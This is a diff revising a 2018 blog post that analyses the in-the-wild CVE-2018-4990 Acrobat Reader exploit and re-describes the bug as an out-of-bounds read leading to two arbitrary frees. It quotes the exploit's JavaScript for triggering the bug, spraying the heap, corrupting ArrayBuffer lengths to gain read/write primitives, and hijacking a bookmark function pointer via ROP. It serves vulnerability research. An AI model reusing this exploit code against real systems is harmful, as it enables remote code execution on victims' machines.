@@ -1,18 +1,23 @@
 ---
 layout: post
-title: "Adobe, Me and a Double Free :: Analyzing the CVE-2018-4990 Zero-Day Exploit"
+title: "Adobe, Me and an Arbitrary Free :: Analyzing the CVE-2018-4990 Zero-Day Exploit"
 date: 2018-05-21 09:00:00 -0500
 categories: blog
 excerpt_separator: <!--more-->
 ---
 
 <img class="excel" alt="Acrobat Reader" src="/assets/images/reader.png">
-<p class="cn" markdown="1">I managed to get my hands on a sample of CVE-2018-4990. This was a zero-day exploit affecting Acrobat Reader that was recently patched by Adobe in [apsb18-09](https://helpx.adobe.com/security/products/acrobat/apsb18-09.html). [Anton Cherepanov](https://www.welivesecurity.com/author/acherepanov/) at ESET wrote a blog post on it ([A tale of two zero-days](https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/)) which is a decent analysis, but it was missing some important things for me, such as how is the double free actually exploited.</p>
+<p class="cn" markdown="1">
+**Update!** I originally titled this blog post 'Adobe, Me and a Double Free', however as a good friend of mine [Ke Liu](https://twitter.com/klotxl404/status/998777393262166017) of Tencent's Xuanwu LAB pointed out, this vulnerability is actually an out-of-bounds read that leads to two arbitrary free conditions. Therefore I have updated my analysis of the root cause of the vulnerability as well as the exploitation.
+</p>
+
+<p class="cn" markdown="1">
+I managed to get my hands on a sample of CVE-2018-4990. This was a zero-day exploit affecting Acrobat Reader that was recently patched by Adobe in [apsb18-09](https://helpx.adobe.com/security/products/acrobat/apsb18-09.html). [Anton Cherepanov](https://www.welivesecurity.com/author/acherepanov/) at ESET wrote a marketing blog post on it ([A tale of two zero-days](https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/)) which was a ~~decent~~, pretty poor analysis and it was missing some important things for me, such as how was the bug actually exploited?</p>
 <!--more-->
 
 <p class="cn">TL;DR</p>
 
-<p class="cn">I walk through how the attacker(s) exploited CVE-2018-4990 which is a Double Free in Acrobat Reader when processing specially crafted JPEG2000 images.</p>
+<p class="cn">I walk through how the attacker(s) exploited CVE-2018-4990 which is an out of bounds read in Acrobat Reader when processing specially crafted JPEG2000 images.</p>
 
 ### Introduction
 
@@ -29,13 +34,13 @@ The first thing I needed to do was uncompress the PDF as many objects are compre
 <p class="cn" markdown="1">
 Since I don't have an original sample of the JPEG2000 image, I have no idea if this image was bitflipped or not, so I am only going to dive into the JavaScript.
 
-After stripping away the rest of the JavaScript, we can see the following code will trigger the double free:</p>
+After stripping away the rest of the JavaScript, we can see the following code will trigger the out of bounds read:</p>
 
 ```JavaScript
 function trigger(){
-    var f1 = this.getField("Button1");
-    if(f1){
-        f1.display = display.visible;
+    var f = this.getField("Button1");
+    if(f){
+        f.display = display.visible;
     }
 }
 trigger();
@@ -49,13 +54,13 @@ The JavaScript comes from an OpenAction triggered from the root node</p>
 
 1 0 obj 
 <<
-/Length 133
+/Length 130
 >>
 stream
 function trigger(){
-    var f1 = this.getField("Button1");
-    if(f1){
-        f1.display = display.visible;
+    var f = this.getField("Button1");
+    if(f){
+        f.display = display.visible;
     }
 }
 trigger();
@@ -129,82 +134,110 @@ WARNING: Stack unwind information not available. Following frames may be wrong.
 0022a9d0 50dbd949 c0010000 0000000d 45c3aa50 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76de1
 ```
 
-<p class="cn" markdown="1">We can see that the caller to free was JP2KLib!JP2KCopyRect+0xbae6, let's dive into that function to see where the second free is triggered.</p> 
+<p class="cn" markdown="1">We can see that the caller to free was JP2KLib!JP2KCopyRect+0xbae6, let's dive into that function to see what is happening.</p>
 
 {% include image.html
             img="assets/images/reader-df.png"
-            title="The location of the double free in sub_1004F3BD"
-            caption="The location of the double free in sub_1004F3BD"
-            style="width:60%;height:60%" %}
+            title="The location of the out of bounds read in sub_1004F3BD"
+            caption="The location of the out of bounds read in sub_1004F3BD"
+            style="width:50%;height:50%" %}
+
+<p class="cn" markdown="1">We can see that we are actually within a looped operation. The code is looping over an index which is used to read values out of a buffer. The buffer that its trying to read from is size 0x3f4. So if the index is 0xfd we have a read from buffer+(0xfd*0x4) == 0x3f4 which is the first dword out of bounds. Now if the loop continues for one last time (0xfe < 0xff) then we have a second out of bounds read of another dword. Therefore this bug reads 8 bytes out of bounds.</p>
+
+<p class="cn" markdown="1">If the value that it reads is not null, then the code pushs the out of bounds value as the first argument to sub_10066FEA and calls it.</p>
+
+<p class="cn" markdown="1">Were going to set a break point just before the caller on the `push eax` to check what is happening.</p>
+
+```
+Breakpoint 1 hit
+eax=d0d0d0d0 ebx=00000000 ecx=000000fd edx=00000001 esi=33b6cf98 edi=68032e88
+eip=667e056e esp=0028a724 ebp=0028a838 iopl=0         nv up ei ng nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
+JP2KLib!JP2KCopyRect+0xbae0:
+667e056e 50              push    eax
+0:000> bl
+ 0 e 667e056e     0001 (0001)  0:**** JP2KLib!JP2KCopyRect+0xbae0
+0:000> dd poi(esi+0x48)+0x4 L1
+4732cfe4  000000ff
+0:000> r ecx
+ecx=000000fd
+```
+
+<p class="cn" markdown="1">We can clearly see that the upper bound is 0xff and the current index is 0xfd. I am unsure if this upper bound value is controllable, the `display.visible` constant is actually 0.</p>
+
+<p class="cn" markdown="1">Depending on what sub_10066FEA does with the out of bounds value (eax), will actually determine the exploitability of this bug. But we already know already that it eventually tries to free the first argument. So essentially, this is an out of bounds read that leads to two arbitrary free's.</p>
 
 <p class="cn" markdown="1">
-
-So in order to trigger the vulnerability, the following rendering order happens:
-</p>
-
-<div markdown="1" class="cn">
-1. Load PDF, parse (presumably) a malformed JP2K image inside of a field button. This triggers the first free.
-2. Load the OpenAction which contains the JavaScript that will access the field button, setting a property and triggering the second free.
-</div>
-
-<p class="cn" markdown="1">
-This gives the attackers a solid chance to re-use the freed chunk in JavaScript to trigger a use-after-free condition from the second free. I imagine having JavaScript execution before and after the heap buffer overflow in [CVE-2017-3055](https://www.zerodayinitiative.com/advisories/ZDI-17-280/) at Pwn2own 2017 was also required.
-
 An interesting sidenote is, that many vulnerabilities are triggered via malformed static content combined with dynamic content accessing and manipulating that malformed content. This type of fuzzing is harder since it requires combined, mutation and generation based fuzzing strategies in a single fuzz iteration.</p>
 
 #### Exploitation
 
-<p class="cn" markdown="1">Before triggering the bug, the attackers used the following JavaScript:</p>
+<p class="cn" markdown="1">
+So in order to reach the arbitrary free's though, the attacker needs to perform the following:
+</p>
+
+<div markdown="1" class="cn">
+1. Load PDF, parse (presumably) a malformed JP2K image inside of a field button.
+2. Allocate a large amount of ArrayBuffer's that are just larger than the buffer that is read out of bounds
+3. Set the precise index (which is 249 and 250) with pointers to what the attackers want to free
+4. Free every second ArrayBuffer so that the allocation will land in a slot
+5. Trigger the bug which actually allocates into a slot and read out of bounds, freeing the two pointers
+</div>
+
+<p class="cn" markdown="1">This is what the JavaScript code looks like to so this:</p>
 
 ```JavaScript
 var a         = new Array(0x3000);
 var spraynum  = 0x1000;
 var sprayarr  = new Array(spraynum);
 var spraylen  = 0x10000-24;
+var spraybase = 0x0d0e0048;
 
-// force allocations to get a clean heap
+// force allocations to prepare the heap for the oob read
 for(var i = 1; i < 0x3000; i++){
     a[i] = new Uint32Array(252);
+    a1[i1][249] = spraybase;
+    a1[i1][250] = spraybase + 0x10000;
 }
 
-// alloc to reclaim the freed buffer
+// heap spray to land ArrayBuffers at 0x0d0e0048 and 0x0d0f0048
 for(var i = 1; i < spraynum; i++){
     sprayarr[i] = new ArrayBuffer(spraylen);
 }
 
-// make holes
+// make holes so the oob read chunk lands here
 for(var i = 1; i < 0x3000; i = i+2){
     delete a[i1];
     a[i1] = null;
 }
 ```
 
-<p class="cn" markdown="1">Essentially what this code is doing is stage 1:</p>
+<p class="cn" markdown="1">Essentially what this code is doing to get the frees:</p>
 
 ```
-Stage 1 - Prepare Heap                    Stage 2 - Double Free                     Stage 3 - Reclaim Freed
-+------------------------+                +------------------------+                +------------------------+
+1. - Prepare Heap                         2. Alloc from JP2KLib                     3. OOB read and free
++-------+----------------+                +-------+----------------+                +-------+----------------+
 |                        |                |                        |                |                        |
 |    Bin size: 0x508     |                |    Bin size: 0x508     |                |    Bin size: 0x508     |
 |                        |                |                        |                |                        |
-|    +--------------+    |                |    +--------------+    |                |    +--------------+    |
-|    |              |    |                |    |              |    |                |    |              |    |
-|    |  Freed       |    |                |    |  Freed       |    |                |    |  Freed       |    |
-|    |              |    |                |    |              |    |                |    |              |    |
-|    +--------------+    |                |    +--------------+    |                |    +--------------+    |
 |    +--------------+    |                |    +--------------+    |                |    +--------------+    |
 |    |              |    |                |    |              |    |                |    |              |    |
 |    |  Allocated   |    |                |    |  Allocated   |    |                |    |  Allocated   |    |
 |    |              |    |                |    |              |    |                |    |              |    |
 |    +--------------+    |                |    +--------------+    |                |    +--------------+    |
 |    +--------------+    |                |    +--------------+    |                |    +--------------+    |
+|    |              |    |                |    |              |    | OOB read into  |    |              |    +----+
+|    |  Freed       |    | +------------> |    |  Allocated   |    | +------------> |    |  Allocated   |    +--------+
+|    |              |    |                |    |              |    | next chunk!    |    |              |    |    |   |
+|    +--------------+    |                |    +--------------+    |                |    +--------------+    |    |   |
+|    +--------------+    |                |    +--------------+    |                |    +--------------+    |    |   |
+|    |              |    |                |    |              |    |                |    |  0x0d0e0048  |    | <--+   |
+|    |  Allocated   |    |                |    |  Allocated   |    |                |    |  0x0d0f0048  |    | <------+
+|    |              |    |                |    |              |    |                |    |  Allocated   |    |
+|    +--------------+    |                |    +--------------+    |                |    +--------------+    |
+|    +--------------+    |                |    +--------------+    |                |    +--------------+    |
 |    |              |    |                |    |              |    |                |    |              |    |
-|    |  Allocated   |    | +------------> |    |  Freed       |    | +------------> |    |  Freed       |    |
-|    |              |    |                |    |              |    |                |    |  chunks      |    |
-|    +--------------+    |                |    +--------------+    |                |    |  coalesced   |    |
-|    +--------------+    |                |    +--------------+    |                |    |              |    |
-|    |              |    |                |    |              |    |                |    |              |    |
-|    |  Freed       |    |                |    |  Freed       |    |                |    |              |    |
+|    |  Freed       |    |                |    |  Freed       |    |                |    |  Freed       |    |
 |    |              |    |                |    |              |    |                |    |              |    |
 |    +--------------+    |                |    +--------------+    |                |    +--------------+    |
 |                        |                |                        |                |                        |
@@ -212,23 +245,56 @@ Stage 1 - Prepare Heap                    Stage 2 - Double Free                 
 
 ```
 
-<p class="cn" markdown="1">The code that makes the holes is using `for(var i = 1; i < 0x3000; i = i+2)` meaning that for every 2 allocations, a free is triggered. Then, the double free is triggered on one of the allocated slots. When this happens, the windows heap manager coalesces the chunks producing an empty slot of 0x2000.
-</p>
+<p class="cn" markdown="1">Size 252 is used because 252 * 4 is 0x3F0. Then if we add the header (0x10) the total is 0x400. This is just enough to allocate 8 bytes over the top of the target buffer to exploit the out of bounds read.</p>
 
-<p class="cn" markdown="1">Now that the attackers have created this condition, they perform the following JavaScript code:</p>
+<p class="cn" markdown="1">So the attackers free two buffers of size 0x10000 which gives them a nice use-after-free condition in JavaScript since they already have references to `sprayarr`. Since the buffers are sequential, coalescing occurs and the freed buffer becomes size 0x20000.</p>
+
+<p class="cn" markdown="1">So after the two free's occur, we are left with the heap in this state.</p>
+
+```
+1 - Spray Heap                    2 - Trigger arbitrary free        3 - Trigger arbitrary free        4 - Coalesce the 2 chunks
++------------------------+        +------------------------+        +------------------------+        +------------------------+
+|                        |        |                        |        |                        |        |                        |
+|    Size: 0x10000       |        |    Size: 0x10000       |        |    Size: 0x10000       |        |    Size: 0x10000       |
+|                        |        |                        |        |                        |        |                        |
+|    +--------------+    |        |    +--------------+    |        |    +--------------+    |        |    +--------------+    |
+|    |              |    |        |    |              |    |        |    |              |    |        |    |              |    |
+|    |  Allocated   |    |        |    |  Allocated   |    |        |    |  Allocated   |    |        |    |  Allocated   |    |
+|    |              |    |        |    |              |    |        |    |              |    |        |    |              |    |
+|    +--------------+    |        |    +--------------+    |        |    +--------------+    |        |    +--------------+    |
+|    +--------------+    |        |    +--------------+    |        |    +--------------+    |        |    +--------------+    |
+|    |              |    |        |    |              |    |        |    |              |    |        |    |              |    |
+|    |  Allocated   |    |        |    |  Allocated   |    |        |    |  Allocated   |    |        |    |  Allocated   |    |
+|    |              |    |        |    |              |    |        |    |              |    |        |    |              |    |
+|    +--------------+    |        |    +--------------+    |        |    +--------------+    |        |    +--------------+    |
+|    +--------------+    |        |    +--------------+    |        |    +--------------+    |        |    +--------------+    |
+|    |              |    |        |    |              |    |        |    |              |    |        |    |              |    |
+|    |  Allocated   |    | +----> |    |  Freed       |    | +----> |    |  Freed       |    |+--     |    |  Freed       |    |
+|    |              |    |        |    |              |    |        |    |              |    |  |     |    |  chunks      |    |
+|    +--------------+    |        |    +--------------+    |        |    +--------------+    |  ----> |    |  coalesced   |    |
+|    +--------------+    |        |    +--------------+    |        |    +--------------+    |  ----> |    |  size:       |    |
+|    |              |    |        |    |              |    |        |    |              |    |  |     |    |  0x20000     |    |
+|    |  Allocated   |    |        |    |  Allocated   |    | +----> |    |  Freed       |    |+--     |    |              |    |
+|    |              |    |        |    |              |    |        |    |              |    |        |    |              |    |
+|    +--------------+    |        |    +--------------+    |        |    +--------------+    |        |    +--------------+    |
+|                        |        |                        |        |                        |        |                        |
++------------------------+        +------------------------+        +------------------------+        +------------------------+
+
+```
+
+<p class="cn" markdown="1">Now all the attackers need to do is allocate a TypedArray of 0x20000 and using the `sprayarr` reference, find it to overwrite the next ArrayBuffer's byte length.</p>
 
 ```JavaScript
     // reclaims the memory, like your typical use after free
     for(var i = 1;i < 0x40; i++){
         sprayarr2[i] = new ArrayBuffer(0x20000-24);
     }
-```
-<p class="cn" markdown="1">This code reclaims the freed memory from the double free and since the slot is larger (due to the coalesce) they need to allocate double the size than they originally did. Now that the attackers have reclaimed the freed memory they need to find out which ArrayBuffer inside of `sprayarr` has been doubled in size.</p>
 
-```JavaScript
+    // look for the TypedArray that is 0x20000 in size
     for(var i = 1;i < spraynum; i++){
         if( sprayarr[i].byteLength == 0x20000-24){
             
+            // This is the magic, overwrite the next TypedArray's byte length
             var biga = new DataView(sprayarr[i1]);
             biga.setUint32(0x10000-12,0x66666666);
 
@@ -244,7 +310,7 @@ Stage 1 - Prepare Heap                    Stage 2 - Double Free                 
             }
 ```
 
-<p class="cn" markdown="1">Now that they know, which has a large size, they use it to overwrite the byte length of the adjacent ArrayBuffer. Then they just check that the next ArrayBuffer has a matching byte length and if it does, then they have a full read/write primitive.</p>
+<p class="cn" markdown="1">Now that they know, which TypedArray has a large size (`if( sprayarr[i].byteLength == 0x20000-24)`), they use it to overwrite the byte length of the adjacent ArrayBuffer (`var biga = new DataView(sprayarr[i1]); biga.setUint32(0x10000-12,0x66666666);`). Then they just check that the next ArrayBuffer has a matching byte length (`if(sprayarr[i+1].byteLength == 0x66666666)`) and if it does, then they have a full read/write primitive out of that adjacent ArrayBuffer using a DataView (`biga = new DataView(sprayarr[i+1]);`).</p>
 
 ```
 function myread(addr){
@@ -260,7 +326,7 @@ function mywrite(addr,value){
     mydv.setUint32(mypos,myarraybase,true);
 }
 ```
-<p class="cn" markdown="1">At this point it's game over. They could have gone with a data only attack but there is no need since Acrobat Reader has no Control Flow Guard (CFG) so they opted for the traditional call gate control flow. First they located the EScript.api and got the dll base address, then they built a rop chain with a dll loader stub, overwrote the bookmark object's execute function pointer to finally redirect execution flow.</p>
+<p class="cn" markdown="1">Naturally, they use some helper functions to use the new read/write primitive. At this point it's game over. They could have gone with a data only attack but there is no need since Acrobat Reader has no Control Flow Guard (CFG) so they opted for the traditional call gate control flow. First they located the EScript.api and got the dll base address, then they built a rop chain with a dll loader stub, overwrote the bookmark object's execute function pointer to finally redirect execution flow.</p>
 
 ```
 var bkm = this.bookmarkRoot;        
@@ -287,4 +353,5 @@ As already mentioned, this sample looks like it was still in active development,
 
 <div markdown="1" class="cn">
 - [https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/](https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/)
+- [Ke Liu](https://twitter.com/klotxl404/status/998777393262166017)
 </div>
